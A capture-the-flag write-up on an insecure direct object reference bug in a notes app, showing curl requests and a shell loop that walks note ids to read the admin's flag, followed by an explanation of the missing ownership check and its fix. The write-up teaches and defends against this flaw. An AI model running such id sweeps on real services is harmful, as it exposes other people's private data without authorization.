HappyVault — Reading other people's notes (IDOR)

#The challenge

HappyVault is a small "private notes" web app. You get an account, you save notes, nobody else can see them. Or so the description claims. Our job is to read the note belonging to the admin, which contains the flag.

Target: https://happyvault.chal.example/. Sign up, log in, and you land on your notes dashboard.

#Recon

After logging in, opening a note makes a request to a predictable endpoint. Let's watch it with curl, reusing our session cookie:

bash
1 2 3 4 5
# grab our own note — note the id in the URL
$ curl -s -b "session=eyJ1aWQiOj4..." \
       https://happyvault.chal.example/api/note?id=4081

{"id":4081,"owner":"naren","body":"grocery list"}

The note is fetched purely by its numeric id. The server never seems to check whether that note actually belongs to us — it just trusts the id in the request.

Note — Whenever an app fetches a resource by an id you can change, ask the obvious question: does the server verify you're allowed to see it?

#Why this works

This is a textbook IDOR — Insecure Direct Object Reference. The app exposes an internal identifier (the note id) directly to the user and uses it to look things up, but forgets the authorization step. Knowing the id is treated as the same thing as being allowed to read it. They're not the same thing.

#Getting the flag

If ids are sequential, the admin's note is probably an early one. Let's walk the low ids:

bash
1 2 3 4 5 6
# sweep the first handful of note ids
$ for id in $(seq 1 10); do
    curl -s -b "session=eyJ1aWQiOjQ..." \
         https://happyvault.chal.example/api/note?id=$id
  done

{"id":3,"owner":"admin","body":"flag: CTF{idor_is_an_access_control_bug}"}

Note id=3 belongs to admin, and the server hands it over without a second thought.

Flag
CTF{idor_is_an_access_control_bug}

#How you'd fix it

The fix isn't to hide or randomise the id (that's just slowing an attacker down). It's to add the missing check: on every lookup, confirm the note's owner matches the logged-in user before returning it.

Heads up — UUIDs instead of sequential ids make sweeping harder, but an IDOR is still an IDOR. Authorization is the real fix, obscurity is not.
